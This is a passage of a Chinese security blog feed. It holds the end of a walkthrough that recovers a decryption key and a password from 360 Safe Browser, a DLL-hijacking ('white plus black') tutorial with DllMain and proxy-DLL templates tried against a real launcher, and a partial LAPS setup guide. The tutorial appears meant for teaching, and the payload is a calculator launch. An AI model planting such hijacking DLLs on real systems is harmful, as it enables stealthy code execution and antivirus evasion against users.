src="/img/360SafeBrowser/ed5eabe2-4954-4101-900c-244cc78b1214.png" alt="img"></p><p><img src="/img/360SafeBrowser/f7375b32-8d09-4e7a-8edf-19fe0bb455d7.png" alt="img"></p><p><img src="/img/360SafeBrowser/fb64a57b-2a95-4afa-8d52-ba1e0c3166fc.png" alt="img"></p><p><img src="/img/360SafeBrowser/0189aff0-2c48-4c04-ad88-89cb09375184.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F4E7E断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/01fa40c0-0c0b-49ff-a0ca-b42330e5ac93.png" alt="img"></p><p>再一次找到了密文解密的点</p><p><img src="/img/360SafeBrowser/e04828cb-e63d-46b4-929f-539b7aeea317.png" alt="img"></p><p><img src="/img/360SafeBrowser/12cd9644-ae02-413a-9818-dc2df507d52a.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F5328断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/b6545905-8973-4e89-ace3-b78df91bc6a1.png" alt="img"></p><pre><code>1560A2E8  01 13 73 0D 78 62 71 32 33 4D 7A 15 78 61 41 5F  ..s.xbq23Mz.xaA_  1560A2F8  52 5F 4D 39 77 06 71 47 38 21 48 1A 4D 0D 78 19  R_M9w.qG8!H.M.x.  1560A308  4E 5E 4F 52 67 0C 53 30 7A 00 00 00 00 00 00 00  N^ORg.S0z.......  </code></pre><p><img src="/img/360SafeBrowser/3fb10444-94b5-439b-8505-add24917c8f8.png" alt="img"></p><p>那么这就有一个问题了，进入到691F5328断点前，其实已经解密了，691F5328只是处理解密后的字符串得到密码。</p><p>回到691F5328断点前寻找解密函数。</p><p><img src="/img/360SafeBrowser/2ec8837d-c531-42ee-bb96-1065e2be8f47.png" alt="img"></p><p><img src="/img/360SafeBrowser/92383bbb-0ae3-4997-8712-b8241f844ba2.png" alt="img"></p><p><img src="/img/360SafeBrowser/99968427-6908-45b0-8cfe-40e74c97a3a4.png" alt="img"></p><p><img src="/img/360SafeBrowser/88c55d5f-96e6-4ba8-beb9-1074ded4ef7a.png" alt="img"></p><p><img src="/img/360SafeBrowser/7699ac5d-dc36-4ff3-b614-97b43079e31b.png" alt="img"><img src="/img/360SafeBrowser/c8a1f11e-fed0-4dac-8f89-7023423e2ef8.png" alt="img"></p><p>这时候突然想到，既然691F50A0是解密的函数，那么密钥可能是从外部传参进来的，那么就不应该再691F50A0里找密钥，而是在691F50A0上面找</p><p><img src="/img/360SafeBrowser/660487aa-9ac7-4627-a060-e21cbb7fa3a7.png" alt="img"></p><pre><code>0E25F104  63 66 36 36 66 62 35 38 66 35 63 61 33 34 38 35  cf66fb58f5ca3485  </code></pre><p><img src="/img/360SafeBrowser/0602fd2f-9ad9-4989-a35d-fac7fd55cd96.png" alt="img"></p><p>判断奇偶得到密码</p><pre><code>sxq3zxARMwq8HMxNOgSz</code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态调试360安全浏览器获取密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之dll劫持（白加黑）</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之dll劫持（白加黑）"><a href="#钓鱼与社工系列之dll劫持（白加黑）" class="headerlink" title="钓鱼与社工系列之dll劫持（白加黑）"></a>钓鱼与社工系列之dll劫持（白加黑）</h1><h2 id="0x00-知识扫盲"><a href="#0x00-知识扫盲" class="headerlink" title="0x00 知识扫盲"></a>0x00 知识扫盲</h2><h3 id="0x00-1-什么是dll？"><a href="#0x00-1-什么是dll？" class="headerlink" title="0x00-1 什么是dll？"></a>0x00-1 什么是dll？</h3><p>​    DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。</p><h3 id="0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit"><a href="#0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit" class="headerlink" title="0x00-2 DLL劫持漏洞（DLL Hijacking Exploit"></a>0x00-2 DLL劫持漏洞（DLL Hijacking Exploit</h3><p>​    严格点说，它是通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL的一类漏洞的统称。</p><p>​    DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary来看。熟悉Windows代码的同学都知道，调用LoadLibrary时可以使用DLL的相对路径。这时，系统会按照特定的顺序搜索一些目录，以确定DLL的完整路径。根据MSDN文档的约定，在使用相对路径调用LoadLibrary（同样适用于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的DLL文件（会根据SafeDllSearchMode配置而稍有不同）。</p><p>（参考链接：<a href="https://security.tencent.com/index.php/blog/msg/20）" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/20）</a></p><pre><code>程序所在目录。加载 DLL 时所在的当前目录。系统目录即 SYSTEM32 目录。16位系统目录即 SYSTEM 目录。Windows目录。PATH环境变量中列出的目录</code></pre><h3 id="0x00-3-白加黑"><a href="#0x00-3-白加黑" class="headerlink" title="0x00-3 白加黑"></a>0x00-3 白加黑</h3><p>​    所谓的”白加黑”，笼统来说是”白exe”加”黑dll”，”白exe”是指带有数字签名的正常exe文件，那么”黑dll”当然是指包含恶意代码 的dll文件。病毒借助那些带数字签名且在杀毒软件白名单内的exe程序去加载自己带有恶意代码的dll，便能获得杀毒软件主动防御的自动信任，从而成功 加载到系统中。</p><h2 id="0x01-编译介绍"><a href="#0x01-编译介绍" class="headerlink" title="0x01 编译介绍"></a>0x01 编译介绍</h2><p>Release的exe文件链接的是标准的MFC DLL(Use MFC in a shared or static dll)。这些DLL在安装Windows的时候已经配置，所以这些程序能够在没有安装Visual C++的机器上运行。而Debug版本的exe链接了调试版本的MFC DLL文件，在没有安装Visual C++的机器上不能运行，因为缺相应的DLL，除非选择use static dll when link。</p><p>静态编译：debug状态下：MTd release状态下：MT</p><p>动态编译：debug状态下：MDd release状态下：MD</p><p>动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p><p>所以综上所述，我们选择静态编译，Release！</p><h2 id="0x02-编写一个dll文件"><a href="#0x02-编写一个dll文件" class="headerlink" title="0x02 编写一个dll文件"></a>0x02 编写一个dll文件</h2><p>创建dll项目</p><p><img src="/img/dllHijacking/ddb4c80b-a50f-41f9-8faf-5cbd7a2a93d8.png" alt="img"></p><p><img src="/img/dllHijacking/d0608f5a-729c-4851-8fb9-d12140bb4333.png" alt="img"></p><p><img src="/img/dllHijacking/3bed69d3-d7e2-49df-9a78-f5adac8a7752.png" alt="img"></p><p><img src="/img/dllHijacking/65e5cc4a-397a-453d-b902-9e61ce100734.png" alt="img"></p><p><img src="/img/dllHijacking/d57ad161-432b-44a0-b75e-57033b5ee38d.png" alt="img"></p><p><img src="/img/dllHijacking/fb4c4aff-59f0-4e89-98fa-9c2ae404e8ed.png" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL,L&quot;_Title_&quot;,L&quot;Hello&quot;,MB_OK);    return;}</code></pre><p><img src="/img/dllHijacking/ad374a13-c7aa-4dc0-9600-0c1ca4c1b97d.png" alt="img"></p><p><img src="/img/dllHijacking/4146bea6-9175-4598-845d-42778d7c7650.png" alt="img"></p><p><img src="/img/dllHijacking/a1879903-5f2e-426c-9169-5ecb77adb0f3.png" alt="img"></p><h2 id="0x03-两种劫持方法"><a href="#0x03-两种劫持方法" class="headerlink" title="0x03 两种劫持方法"></a>0x03 两种劫持方法</h2><h3 id="0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件"><a href="#0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件" class="headerlink" title="0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件"></a>0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件</h3><p><strong>某个exe程序运行的时候，使用ProcessMonitor监听</strong></p><p><strong>1. result为NAME NOT FOUND，即找不到dll文件（dll文件名为A.dll）。</strong></p><p><strong>2. 该dll文件调用了LoadLibrary函数</strong></p><p><strong>3. 自己编写dll，重命名A.dll。</strong></p><p><strong>4. 重复之前的程序运行过程，就可以劫持</strong></p><p>DllMain里的代码是程序加载dll文件时，可以选择</p><p>1.进程装载DLL。</p><p>2.进程卸载DLL。</p><p>3.DLL在被装载之后创建了新线程。</p><p>4.DLL在被装载之后一个线程被终止了</p><p>这四种情况下执行恶意代码，</p><p>测试dll文件是否可用性，可以执行rundll32 DllMain.dll aaaaaa(随便加函数名) 调用</p><p><strong>一般选择DLL_PROCESS_ATTACH，则进程加载DLL时就会执行恶意代码</strong></p><p><strong>劫持dll的代码模板</strong></p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/3311b3ad-835d-4eec-825f-65308f0641b8.png" alt="img"></p><p><img src="/img/dllHijacking/97186110-36b5-4b35-8423-0c8cb9dcd733.jpg" alt="img"></p><h3 id="0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件"><a href="#0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件" class="headerlink" title="0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件"></a>0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件</h3><p><strong>某个exe程序运行的时候，监控某个功能（例如截图）所调用的dll文件</strong></p><p><strong>1. 使用CFFExplorer工具查看该dll文件(dll文件名为B)，导入目录里的kerbel32.dll里是否调用了LoadLibrary。</strong></p><p><strong>2. 如果调用了LoadLibrary，则在导出目录找导出的函数名（函数名为C）</strong></p><p><strong>3. 自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll</strong></p><p><strong>4. 运行该程序的某个功能，即可劫持</strong></p><p>代码demo</p><p>extern导出函数的代码可以用rundll32 dllExtern.dll test(函数名) 调用</p><p>extern “C” extern “C”使得在C++中使用C编译方式成为可能。在“C++”下定义“C”函数，需要加extern “C”关键词。用extern “C”来指明该函数使用C编译方式。输出的“C”函数可以从“C”代码里调用</p><p>__declspec(dllexport)的作用就是让编译器按照某种预定的方式（前面大致解释了这种方式的规则）来输出导出函数及变量的符号</p><p><img src="/img/dllHijacking/7acdb63b-b8dc-43c6-a762-efd640138ca5.jpg" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    WinExec(&quot;calc.exe&quot;, SW_HIDE);    return;}</code></pre><p><img src="/img/dllHijacking/77ce6d79-41a6-4e60-b75e-8c3eb77cd7c6.png" alt="img"></p><p><img src="/img/dllHijacking/fec18db9-81d3-4f05-af6b-5097d3c34bd2.jpg" alt="img"></p><p><strong>劫持dll的代码模板</strong></p><p><strong>假设程序加载的dll名字为B，B.dll的导出函数为C</strong></p><p><strong>劫持的dll名字改为B</strong></p><p><strong>B.dll改为B_Origin.dll</strong></p><p><strong>PrScrn改为C</strong></p><p><strong>PrScrn_Origial.dll改为B_Origin.dll</strong></p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void PrScrn();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void PrScrn(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;PrScrn_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;PrScrn&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><h2 id="0x04-本地dll劫持场景模拟"><a href="#0x04-本地dll劫持场景模拟" class="headerlink" title="0x04 本地dll劫持场景模拟"></a>0x04 本地dll劫持场景模拟</h2><p>模拟一个exe程序调用dll文件，然后用自己的dll去劫持</p><h3 id="0x04-1-创建dll项目，项目名为aaa"><a href="#0x04-1-创建dll项目，项目名为aaa" class="headerlink" title="0x04-1 创建dll项目，项目名为aaa"></a>0x04-1 创建dll项目，项目名为aaa</h3><p>源.cpp</p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL, TEXT(&quot;我是程序运行时正常加载的dll&quot;), TEXT(&quot;hello&quot;), NULL);    return;}</code></pre><p><img src="/img/dllHijacking/56f864e9-d608-4075-a419-b6c909d3dd47.png" alt="img"></p><h3 id="0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll"><a href="#0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll" class="headerlink" title="0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll"></a>0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll</h3><p><img src="/img/dllHijacking/d6443f71-fc0f-4c41-ae5f-91a92c2c9f6b.png" alt="img"></p><p><img src="/img/dllHijacking/5b9f98d9-2a0b-4437-8dc0-9fed139d3f14.png" alt="img"></p><p>一直下一步直到完成</p><p>从工具箱里托一个按钮</p><p><img src="/img/dllHijacking/5fbb8def-76cc-4e50-aca1-86b5de88c75c.png" alt="img"></p><p>双击按钮，在OnBnClickedButton1函数里添加代码</p><pre><code>void CMFC_aaaDlg::OnBnClickedButton1(){    // TODO: 在此添加控件通知处理程序代码    typedef DWORD (*TEST)();    HINSTANCE hLibrary;    hLibrary = LoadLibrary(TEXT(&quot;aaa.dll&quot;));                // 使用LoadLibrary加载dll    TEST test = (TEST)GetProcAddress(hLibrary, &quot;test&quot;);     // 获取dll文件的函数地址    test();                                                 // 运行函数}</code></pre><p><img src="/img/dllHijacking/7f416a23-0aee-40b4-810f-7df7d1212b25.png" alt="img"></p><p>编译即可。将aaa.dll文件拖到MFC_aaa.exe当前目录下</p><p><img src="/img/dllHijacking/d913a0e7-6a7d-4d77-9762-20d809862adc.png" alt="img"></p><p>运行MFC_aaa.exe，点击Button1，成功加载aaa.dll文件</p><p><img src="/img/dllHijacking/4ba9f664-1864-4ae9-869a-2455c4be222a.png" alt="img"></p><h3 id="0x04-3-模拟劫持未知的dll文件"><a href="#0x04-3-模拟劫持未知的dll文件" class="headerlink" title="0x04-3 模拟劫持未知的dll文件"></a>0x04-3 模拟劫持未知的dll文件</h3><p>当MFC_aaa.exe程序运行的时候，会加载aaa.dll文件。那么当我们用ProcessMonitor去检测，发现aaa.dll文件不存在，并且还调用了LoadLibrary。那么此时就可以劫持。</p><p>环境开始模拟：MFC_aaa.exe当前目录下没有任何dll文件</p><p><img src="/img/dllHijacking/17ddcc92-aea7-45a6-8dae-058134f596e9.png" alt="img"></p><p>使用ProcessMonitor监听</p><p><img src="/img/dllHijacking/3b87a787-0f53-4b06-b552-3dc9f5bc188e.png" alt="img"></p><p><img src="/img/dllHijacking/378b82cb-0553-4596-b266-1b9ce74de8df.png" alt="img"></p><p>运行MFC_aaa.exe，点击button1发现程序加载aaa.dll文件，从当前目录开始查找，但是结果都是没有找到。</p><p>引出一个知识，dll查找路径</p><pre><code>1.程序所在目录。2.加载 DLL 时所在的当前目录。3.系统目录即 SYSTEM32 目录。4.16位系统目录即 SYSTEM 目录。5.Windows目录。6.PATH环境变量中列出的目录</code></pre><p><img src="/img/dllHijacking/84280466-5824-4105-9b90-cf9688e98617.png" alt="img"></p><p>查看aaa.dll的Stack，发现程序是通过LoadLibrary加载的aaa.dll，那么这种情况下就可以做劫持了。</p><p><img src="/img/dllHijacking/00eed3a3-df61-4372-9d5f-7b27928e85c7.png" alt="img"></p><p>开始编写劫持代码，使用DllMain进行劫持，如果劫持成功，就会弹出计算机。</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/be3d945e-fe59-4f88-87a0-fc7a57fc35af.png" alt="img"></p><p>将编译好的dllInject1.dll重命名为aaa.dll，并放到MFC_aaa.exe同目录下，运行MFC_aaa.exe。</p><p>成功劫持了MFC_aaa.exe运行时加载的dll文件</p><p><img src="/img/dllHijacking/6c2e9028-d472-4bd9-bee5-03f7c5d6ea5c.jpg" alt="img"></p><h3 id="0x04-4-模拟劫持存在的dll文件"><a href="#0x04-4-模拟劫持存在的dll文件" class="headerlink" title="0x04-4 模拟劫持存在的dll文件"></a>0x04-4 模拟劫持存在的dll文件</h3><p>MFC_aaa.exe当前程序目录下面存在aaa.dll文件</p><p><img src="/img/dllHijacking/e2e2fc58-044c-49ba-abf7-8a9520f181e5.png" alt="img"></p><p><img src="/img/dllHijacking/10c2602a-23ae-4006-970c-be2a606c26c5.png" alt="img"></p><p>运行MFC_aaa.exe</p><p><img src="/img/dllHijacking/d5e92963-7ab4-4d3c-8e96-677e14d476fc.png" alt="img"></p><p><img src="/img/dllHijacking/6f918fae-61b2-4349-b7f1-d70ea90ebea3.png" alt="img"></p><p>使用CFFExplorer查看aaa.dll文件</p><p><img src="/img/dllHijacking/f748769f-1a4a-49d8-aa87-2dcdc14a3291.png" alt="img"></p><p><img src="/img/dllHijacking/43cdb258-b27c-4ae2-8838-4a8fbebbfdb2.png" alt="img"></p><p>开始编写劫持代码，使用extern进行劫持，如果劫持成功，就会弹出计算机，并且弹框“DLL Hijack! by DLLHijacker!”</p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void test(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;aaa_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><p><img src="/img/dllHijacking/197af274-1b75-4985-8037-6d55819c6834.png" alt="img"></p><p>将编译好的文件放到MFC_aaa.exe同目录下，并且重命名为aaa.dll。原先的aaa.dll重命名为aaa_Origial.dll。</p><p><img src="/img/dllHijacking/c82b5d9a-3dc6-4517-9ad3-741a77185520.png" alt="img"></p><p>运行后成功劫持，弹出计算机和弹框</p><p><img src="/img/dllHijacking/a83deb90-9fbf-4889-a0d1-34cb10037a6e.jpg" alt="img"></p><h2 id="0x05-实战dll劫持"><a href="#0x05-实战dll劫持" class="headerlink" title="0x05 实战dll劫持"></a>0x05 实战dll劫持</h2><p>案例一：音速启动安装时的dll劫持</p><p>监控音速启动调用的dll</p><p><img src="/img/dllHijacking/3361168b-c355-4189-9e1b-5fdea0a18a86.png" alt="img"></p><p>其中一个不存在的dll调用了LoadLibrary</p><p><img src="/img/dllHijacking/24b54885-336d-493c-aca0-6d747ea1c067.png" alt="img"></p><p>编写劫持dll</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p>将dll重命名为Riched20.dll，并放到音速启动程序的同目录下</p><p><img src="/img/dllHijacking/432fff3f-ca3b-4167-b61d-295c7cf8c862.png" alt="img"></p><p>重新运行程序，成功弹出计算机</p><p><img src="/img/dllHijacking/13a96af4-3863-4f38-8a75-41c0bc38bae7.jpg" alt="img"></p><pre><code>存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组策略之LAPS</title>
      <link href="/2020/11/26/zu-ce-lue-zhi-laps/"/>
      <url>/2020/11/26/zu-ce-lue-zhi-laps/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略之Local-Administrator-Password-Solution"><a href="#组策略之Local-Administrator-Password-Solution" class="headerlink" title="组策略之Local Administrator Password Solution"></a>组策略之Local Administrator Password Solution</h1><h2 id="0x00-LAPS介绍"><a href="#0x00-LAPS介绍" class="headerlink" title="0x00 LAPS介绍"></a>0x00 LAPS介绍</h2><p>介绍：</p><pre><code>将本地管理员密码存储在LDAP上，作为计算机账户的一个机密属性，配合GPO，实现自动定期修改密码、设置密码长度、强度等，然后配置某些指的账号，能查看存储的密码，如果用户需要，可以用PowerShell或指的工具查询密码，但对非授权用户，确无法获取，从而实现本机管理员的自动化管理。LAPS使用两个LDAP属性来存储本地管理员凭证，这两个属性分别是ms-MCS-AdmPwd（存储密码）和ms-MCS-AdmPwdExpirationTime（存储过期时间）。</code></pre><p>功能：</p><pre><code>如果配置不当，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号LAPS解决方案的核心是GPO客户端扩展（CSE），它执行以下任务，并可以在GPO更新期间执行以下操作：检查本地Administrator帐户的密码是否已过期。当旧密码过期或需要在过期之前进行更改时，生成新密码。根据密码策略验证新密码。将密码报告给Active Directory，并将密码和机密属性一起存储在Active Directory中。将密码的下一个到期时间报告给Active Directory，并将该属性与计算机帐户的属性一起存储在Active Directory中。更改管理员帐户的密码。然后，允许这样做的用户可以从Active Directory中读取密码。合格的用户可以请求更改计算机的密码。计算机帐户只能写入/更新自己的本地管理员帐户密码（ms-Mcs-AdmPwd属性），而不能从该属性读取密码。可以轻松地为OU中的每台计算机更改密码。</code></pre><p>展示：</p><pre><code>laps再ldap的属性里：      ms-MCS-AdmPwd：存储密码      ms-MCS-AdmPwdExpirationTime：存储过期时间</code></pre><p>靶场环境介绍：</p><pre><code>测试环境:组织 OU：lapsComputers            MOTOO-IISWEB$           域机器组织 OU：lapsAdminUsers            lidan                   域用户组 group： lapsAdmins            lidan                   用户</code></pre><h2 id="0x01-域控创建组织lapsComputers和laspAdminUsers"><a href="#0x01-域控创建组织lapsComputers和laspAdminUsers" class="headerlink" title="0x01 域控创建组织lapsComputers和laspAdminUsers"></a>0x01 域控创建组织lapsComputers和laspAdminUsers</h2><p>创建组织OU</p><p><img src="/img/laps/06be0350-b9fc-4f70-8251-4b1943e29e92.png" alt="img"></p><p><img src="/img/laps/267ccd8a-efc5-482b-887f-206860d1d593.png" alt="img"></p><p><img src="/img/laps/afdccd17-1fb6-494a-abd1-c099e12466c5.png" alt="img"></p><p>成功将Motoo-IISWEB域机器加入到lapsComputers组织里</p><p><img src="/img/laps/a3cfe6ee-031e-43c0-9033-57aadea88a6d.png" alt="img"></p><p><img src="/img/laps/36550d89-2bfc-4a81-bd53-68e589320c10.png" alt="img"></p><p>同样创建组织OU：lapsAdminUsers</p><p>创建组：lapsAdmins</p><p>将liidan域用户加入到组织OU：lapsAdminUsers里，并且加入到组lapsAdmins</p><p><img src="/img/laps/88c58275-6c1e-44bd-8bc5-a9a205ea98c5.png" alt="img"></p><p>通过net user lidan /do可以看到在lapsAdmins组里</p><p><img src="/img/laps/40976aa6-3d48-43e1-b794-b3064c64010d.png" alt="img"></p><h2 id="0x02-安装LAPS"><a href="#0x02-安装LAPS" class="headerlink" title="0x02 安装LAPS"></a>0x02 安装LAPS</h2><p>域控安装laps</p><p><img src="/img/laps/c464ad27-67dc-42ec-9cd1-a77dcf5e68c9.png" alt="img"></p><p><img src="/img/laps/ffc755e3-cdc8-437f-814b-9d516ee3c6a1.png" alt="img"></p><p>扩展AD的架构</p><p>windows2008 的powershell版本是2.0，需要更新到3.0。才能导入Admpwd.ps</p><pre><code>Import-module AdmPwd.PSUpdate-AdmPwdADSchema</code></pre><p>使用Update-AdmPwdADSchema扩展架构</p><p><img src="/img/laps/cb3524f3-5066-4ac4-9368-28a2ee89be40.png" alt="img"></p><p>从活动目录中可以看到多出了这两个属性</p><p><img src="/img/laps/15054f83-f716-448a-96e0-3b9fa4a63729.png" alt="img"></p><p>查询lapsComputers这个OU的访问权限，可以看到目前只有域机器system权限和域管可以访问</p><pre><code>Find-AdmPwdExtendedRights -Identity lapsComputers | Format-Table -AutoSizeFind-AdmPwdExtendedRights -Identity &quot;OU=lapsComputers,DC=Motoo,DC=nc&quot; | Format-Table -AutoSize</code></pre><p><img src="/img/laps/2e624156-bdc6-494d-a2ea-73c1d5c367b7.png" alt="img"></p><p><img src="/img/laps/8e47f1c5-6c1f-44d1-bae3-21d9d27a2931.png" alt="img"></p><p>使用以下命令授予计算机修改本机ms-Mcs-AdmPwdExpirationTime 和 ms-Mcs-AdmPwd这两个扩展属性的权限。</p><pre><code>Set-AdmPwdComputerSelfPermission -OrgUnit lapsComputers</code></pre><p><img src="/img/laps/208df236-fd47-4f17-9fbf-fd8749c6dbcc.png" alt="img"></p><p>使用以下命令设置读取组织lapsComputers里的计算机扩展属性的权限组为lapsAdmins</p><pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/87ccb97d-2d29-4329-ab22-c38707dac924.png" alt="img"></p><p>可以看到成功多了Motoo\lapsAdmins组</p><p><img src="/img/laps/46bd3eb0-d9d7-47fd-9d1e-82d8765870cd.png" alt="img"></p><p>使用以下命令设置重置密码的权限组为LAPAdmins</p><pre><code>Set-AdmPwdResetPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/e71de080-08fa-48ff-b202-074440f24b9e.png" alt="img"></p><p><img src="/img/laps/d6fdfc9f-f28d-4a72-bb1b-119cfa21a7e6.png" alt="img"></p><h2 id="0x03-创建两条组策略链接到创建的OU上"><a href="#0x03-创建两条组策略链接到创建的OU上" class="headerlink" title="0x03 创建两条组策略链接到创建的OU上"></a>0x03 创建两条组策略链接到创建的OU上</h2><pre><code>lapsAdminUsers组织创建组策略install laps           目的：当lapsAdminUsers组织里的域用户登录时，通过组策略安装lapslapsComputers组织创建组策略set laps                目的：当域用户登陆后成功安装了laps后，通过组策略自动修改本地管理员密码</code></pre><p>打开域组策略gpmc.msc，启动组策略管理控制台，右键单击该域，然后单击“ 在此域中创建 GPO并在此处链接”。为GPO提供一个名称。</p><h3 id="0x03-1-lapsAdminUsers组织创建组策略install-laps"><a href="#0x03-1-lapsAdminUsers组织创建组策略install-laps" class="headerlink" title="0x03-1 lapsAdminUsers组织创建组策略install laps"></a>0x03-1 lapsAdminUsers组织创建组策略install laps</h3><p>在lapsAdminUsers的组织里新建一个组策略</p><p><img src="/img/laps/7f93f76b-9304-48e0-af0e-6490f265f358.png" alt="img"></p><p><img src="/img/laps/bd6a7356-251a-494e-a910-719c60f898fc.png" alt="img"></p><p>同时在\Motoo.nc\SYSVOL\Motoo.nc\Policies路径下多了该文件夹</p><p><img src="/img/laps/b1a91f02-8043-4602-bd57-1b8e369c4053.png" alt="img"></p><p>将laps安装包放到该文件夹下的Machine</p><p><img 